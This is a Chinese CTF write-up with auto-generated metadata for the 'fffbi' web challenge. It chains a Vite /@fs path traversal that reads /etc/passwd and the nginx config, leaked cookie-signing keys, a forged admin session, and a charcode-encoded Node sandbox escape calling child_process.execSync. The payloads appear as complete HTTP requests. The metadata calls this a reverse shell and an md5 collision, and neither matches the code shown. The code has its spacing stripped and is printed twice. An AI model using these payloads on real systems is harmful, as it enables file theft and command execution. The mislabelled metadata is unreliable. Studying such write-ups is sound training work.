---
title: 2025"领航杯"网安赛项学生组初赛 WP（中）- fffbi + 反垃圾
contest: 2025 领航杯网安赛项
year: 2025
difficulty: hard
vuln_type:
- lfi
- rce
- ssrf
- web_unknown
- crypto_unknown
tags:
- 领航杯 2025 学生组 fffbi
- vite /@fs/app/vite/#/../../../../../../../../etc/passwd 目录穿越
- nginx /etc/nginx/http.d/default.conf 代理转发
- secretserver/ 内网应用 1337
- cookieSession keys 数组
- Object.freeze Object/Math
- saferEval 沙箱逃逸
- Math.constructor=Function
- global.process.mainModule.constructor._load child_process execSync ls /
- admin=1 改 PHPSESSION
- 反垃圾
attack_chain:
- vite 开发服务器目录穿越：/@fs/app/vite/#/../../../../../../../../etc/passwd
- 读 nginx 配置 /etc/nginx/http.d/default.conf
- 找到 secretserver/ 代理转发到 127.0.0.1:1337
- '读 secretserver 源码: keys=["a42f00ce4bc90b196681051aa150c79a","ca3e7eb9498281338233df353232c0fd"]'
- admin=1 改 PHPSESSION cookie 后台访问
- Object.freeze(Object/Math) 但 Math.constructor=Function 不冻
- saferEval 沙箱：/Math|[()+-*/&|^%<>=,?:]|\d+.?\d*(?:ed+)?| /g
- 绕：Math.constructor=Function, Math.fromCharCode(...) child_process.execSync
- ak=[0],sk=[0] 长度相同但不相等 + md5(ak+keys[0]) == md5(sk+keys[0]) 触发 md5 collision
- 反垃圾：MIME/邮件 spam 检测
key_payload: (Math=>(Math=Math.constructor,Math.x=Math.constructor(Math.fromCharCode(114,101,116,117,...))()))(Math+1)
one_liner: 2025 领航杯学生组 fffbi：vite 目录穿越 + nginx 代理发现 secretserver + Object.freeze 沙箱逃逸 + Math.constructor=Function 反弹 shell。
lesson: vite dev server /@fs/app/ 目录穿越是经典 0day；Object.freeze(Object/Math) 不能冻 .constructor；Math.constructor=Function 反弹 shell 是 NodeJS 沙箱逃逸标准套路。
quality: high
full_path: 2025“领航杯”网安赛项学生组初赛WP（中）.full.md
meta_path: 2025“领航杯”网安赛项学生组初赛WP（中）.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 2025"领航杯"网安赛项学生组初赛 WP（中）- fffbi + 反垃圾。2025 领航杯学生组 fffbi：vite 目录穿越 + nginx 代理发现 secretserver + Object.freeze 沙箱逃逸 + Math.constructor=Function 反弹 shell。。关键路径：vite 开发服务器目录穿越：/@fs/app/vite/#/../../.....
category: web
subcategory: lfi
subcategories:
- lfi
- rce
- ssrf
- web_other
- crypto_other
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/277982.html
reasoning_chain:
- 触发点：vite dev server 见到 /@fs/ 路径 → 假设：经典 Vite 0day 目录穿越 → 动作：GET /@fs/app/vite/#/../../../../../../../../etc/passwd
- 观察：返回 /etc/passwd 全文 → 下一步：读 nginx 配置 /etc/nginx/http.d/default.conf
- 观察：server location /secretserver/ proxy_pass http://127.0.0.1:1337/ → 假设：内网 NodeJS 应用没暴露但通过目录穿越读源码
- 动作：/@fs/app/secretserver/key.js → 观察：keys=["a42f00ce4bc90b196681051aa150c79a","..."]
- 下一步：admin=1 base64 编码 + cookieSession 签名（用 keys[0] HMAC）伪造 PHPSESSION=eyJhZG1pbiI6MSwicmVzdWx0cyI6W119
- 触发点：后台 /admin eval 看到 saferEval 沙箱正则 /Math|[()+\-*\/&|^%<>=,?:]|\d+.?\d*(?:e\d+)?| /g → 假设：禁关键字但 Math.constructor 不冻
- 动作：Object.freeze(Object) Object.freeze(Math) → 但 Math.constructor = Function 不被 freeze
- 下一步：(Math=>(Math=Math.constructor, Math.x=Math.constructor(Math.fromCharCode(...))()))(Math+1) → return global.process.mainModule.constructor._load('child_process').execSync('ls /')
- 触发点：ak 和 sk 长度同但不相等 + md5(ak+keys[0])==md5(sk+keys[0]) → 假设：md5 collision 触发 → 动作：构造碰撞对
failed_attempts:
- 试图单跑 saferEval eval() 全字符串 → 失败：关键字 Math.constructor 被正则匹配
- 试图直接 /secretserver/ 端口转发 → 失败：secretserver 在内网 1337
- 试图用 prototype pollution 改 Object.constructor → 失败：Object 是 freeze 状态不可写
key_observations:
- Vite 0day /@fs/app 目录穿越 = 任何绝对路径文件可读
- Object.freeze() 不能冻结 .constructor → Math.constructor=Function 是沙箱逃逸通用通路
- saferEval 正则匹配 Math.\w+ 但不匹配 Math.constructor
- cookieSession 用 keys[] HMAC 签名，拿到 keys[] 即可伪造 PHPSESSION
- md5 collision（fastcoll）是 PHP 弱类型比较经典组合
prerequisites:
- Vite 0day 目录穿越（CVE 漏洞基础）
- NodeJS 沙箱逃逸（Math.constructor / process.mainModule / child_process）
- md5 collision（fastcoll 工具）
- PHP 反序列化 / cookieSession 签名原理
---
# 2025“领航杯”网安赛项学生组初赛WP（中）

> 原文: https://www.ctfiot.com/277982.html
> ID: 277982

点击上方蓝字关注我们

郑重说明

数字人才创研院秉承探究学习与交流知识‍‍的原则，所有发布的技术文章仅供参考，目的在于助力你获得更多知识；与此同时，让我们共同遵守《网络安全法》，未经授权请勿利用文章中的技术内容对任何计算机系统进行非授权操作，否则对他人或单位而造成的直接或间接后果或损失，均由使用者本人负责。

 公众号发表的文章如有涉及您的侵权，烦请私信联系告知，我们会立即删除并对您表达最诚挚的歉意！感谢您的理解！‍

Purpose of recommendation

推荐观点

赛事的开展不仅给广大参赛选手提供了网络安全实战平台，同时也搭建了发现人才和共同交流的平台。竞技赛场，你追我赶，参赛选手以竞赛活动为契机，以赛促学、以赛促训，畅享不一样“饕餮盛宴”的竞赛。

知己知彼，百战百胜，小编分享官方WP，旨在让大家了解赛事赛题的难度变化与知识范畴，发现团队薄弱之处，提升团队技术能力。

推荐指数：★★★★★

01

Web：fffbi

该题源自于真实项目案例，重点考察源代码分析、目录遍历、传参绕过、命令逃逸等综合内容，难度系数四颗星（难度几乎拉满）；比赛结束后，从实际解题情况来看，无人解出，赛后出题师傅暗自庆幸之余也发出惆怅的感叹，煎熬三个通宵改编的试题，烧脑掉了六根头发，难道是俺武功大增，没有给出自创的“武林秘籍”而导致的后果吗？

/@fs/app/vite/#/../../../../../../../../etc/passwd 可以读取文件

/@fs/app/vite/#/../../../etc/nginx/http.d/default.confHTTP/1.1 200 OKServer: nginxDate: Sun, 24 Aug 2025 14:45:29 GMTContent-Type: text/plainContent-Length: 416Connection: keep-aliveVary: OriginLast-Modified: Sun, 24 Aug 2025 12:32:32 GMTETag: W/"416-1756038752556"Cache-Control: no-cacheserver { listen 80; server_name _; # -> /app/vite/ location / { proxy_pass http://127.0.0.1:
5173; proxy_set_header Host $host; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection"upgrade"; } # -> /app/node/ location /secretserver/ { proxy_pass http://127.0.0.1:
1337/; proxy_set_header Host $host; }}

constexpress =require('express');constbodyParser =require('body-parser');constcookieSession =require('cookie-session');constfs =require('fs');constcrypto =require('crypto');constkeys =require('./key.js').keys;functionmd5(s) {returncrypto.createHash('md5') .update(s) .digest('hex');}functionsaferEval(str) {if(str.replace(/(?:
Math(?:.w+)?)|[()+-*/&|^%<>=,?:]|(?:d+.?d*(?:ed+)?)| /g,'')) { returnnull; }returneval(str);}consttemplate = fs.readFileSync('./index.html').toString();functionrender(results) {returntemplate.replace('{{results}}', results.join('
'));}constapp =express();app.use(bodyParser.urlencoded({extended:
false}));app.use(bodyParser.json());app.use(cookieSession({name:'PHPSESSION', keys}));Object.freeze(Object);Object.freeze(Math);app.post('/',function(req, res) {letresult ='';constresults = req.session.results|| [];if(req.session.admin===1) { const{ e, ak, sk } = req.body; if(ak && sk && ak.length=== sk.length&& ak!==sk &&md5(ak+keys[0]) ===md5(sk+keys[0])) { if(req.body.e) { try{ result =saferEval(req.body.e) ||'Baned!'; }catch(e) { console.log(e); result ='NO!'; } results.unshift(`${req.body.e}=${result}`); } }else{ results.unshift('AK/SK authentication failed!'); } if(results.length>13) { results.pop(); } req.session.results= results; res.send(render(req.session.results)); }else{res.send("Permission denied");}});app.get('/',function(req, res) { res.set('Content-Type','text/html;charset=utf-8'); req.session.admin= req.session.admin||0; res.send(render(req.session.results= req.session.results|| []))});app.listen(1337,'0.0.0.0',() =>{console.log('Start listening')});

module.exports= { keys: ["a42f00ce4bc90b196681051aa150c79a","ca3e7eb9498281338233df353232c0fd"]};

returnglobal.process.mainModule.constructor._load('child_process').execSync('ls /').toString()POST /secretserver/ HTTP/1.1Host:
Content-Length: 457Cache-Control: max-age=0Content-Type: application/jsonUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7Cookie: PHPSESSION=eyJhZG1pbiI6MSwicmVzdWx0cyI6W119; PHPSESSION.sig=5DYV8BNgDW4eD_OPi26KrqynHFQConnection: close{"e":"(Math=>(Math=Math.constructor,Math.x=Math.constructor(Math.fromCharCode(114,101,116,117,114,110,32,103,108,111,98,97,108,46,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,99,111,110,115,116,114,117,99,116,111,114,46,95,108,111,97,100,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,108,115,32,47,39,41,46,116,111,83,116,114,105,110,103,40,41))()))(Math+1)","ak":[0],"sk":[0]}

如果喜欢，敬请关注，后期内容更精彩！

02

Misc：反垃圾

如果喜欢，敬请关注，后期内容更精彩！

END


```
/@fs/app/vite/#/../../../../../../../../etc/passwd 可以读取文件
/@fs/app/vite/#/../../../etc/nginx/http.d/default.confHTTP/1.1 200 OKServer: nginxDate: Sun, 24 Aug 2025 14:45:29 GMTContent-Type: text/plainContent-Length: 416Connection: keep-aliveVary: OriginLast-Modified: Sun, 24 Aug 2025 12:32:32 GMTETag: W/"416-1756038752556"Cache-Control: no-cacheserver { listen 80; server_name _; # -> /app/vite/ location / { proxy_pass http://127.0.0.1:
5173; proxy_set_header Host $host; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection"upgrade"; } # -> /app/node/ location /secretserver/ { proxy_pass http://127.0.0.1:
1337/; proxy_set_header Host $host; }}
constexpress =require('express');constbodyParser =require('body-parser');constcookieSession =require('cookie-session');constfs =require('fs');constcrypto =require('crypto');constkeys =require('./key.js').keys;functionmd5(s) {returncrypto.createHash('md5') .update(s) .digest('hex');}functionsaferEval(str) {if(str.replace(/(?:
Math(?:.w+)?)|[()+-*/&|^%<>=,?:]|(?:d+.?d*(?:ed+)?)| /g,'')) { returnnull; }returneval(str);}consttemplate = fs.readFileSync('./index.html').toString();functionrender(results) {returntemplate.replace('{{results}}', results.join('
'));}constapp =express();app.use(bodyParser.urlencoded({extended:
false}));app.use(bodyParser.json());app.use(cookieSession({name:'PHPSESSION', keys}));Object.freeze(Object);Object.freeze(Math);app.post('/',function(req, res) {letresult ='';constresults = req.session.results|| [];if(req.session.admin===1) { const{ e, ak, sk } = req.body; if(ak && sk && ak.length=== sk.length&& ak!==sk &&md5(ak+keys[0]) ===md5(sk+keys[0])) { if(req.body.e) { try{ result =saferEval(req.body.e) ||'Baned!'; }catch(e) { console.log(e); result ='NO!'; } results.unshift(`${req.body.e}=${result}`); } }else{ results.unshift('AK/SK authentication failed!'); } if(results.length>13) { results.pop(); } req.session.results= results; res.send(render(req.session.results)); }else{res.send("Permission denied");}});app.get('/',function(req, res) { res.set('Content-Type','text/html;charset=utf-8'); req.session.admin= req.session.admin||0; res.send(render(req.session.results= req.session.results|| []))});app.listen(1337,'0.0.0.0',() =>{console.log('Start listening')});
module.exports= { keys: ["a42f00ce4bc90b196681051aa150c79a","ca3e7eb9498281338233df353232c0fd"]};
returnglobal.process.mainModule.constructor._load('child_process').execSync('ls /').toString()POST /secretserver/ HTTP/1.1Host:
Content-Length: 457Cache-Control: max-age=0Content-Type: application/jsonUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7Cookie: PHPSESSION=eyJhZG1pbiI6MSwicmVzdWx0cyI6W119; PHPSESSION.sig=5DYV8BNgDW4eD_OPi26KrqynHFQConnection: close{"e":"(Math=>(Math=Math.constructor,Math.x=Math.constructor(Math.fromCharCode(114,101,116,117,114,110,32,103,108,111,98,97,108,46,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,99,111,110,115,116,114,117,99,116,111,114,46,95,108,111,97,100,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,108,115,32,47,39,41,46,116,111,83,116,114,105,110,103,40,41))()))(Math+1)","ak":[0],"sk":[0]}
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]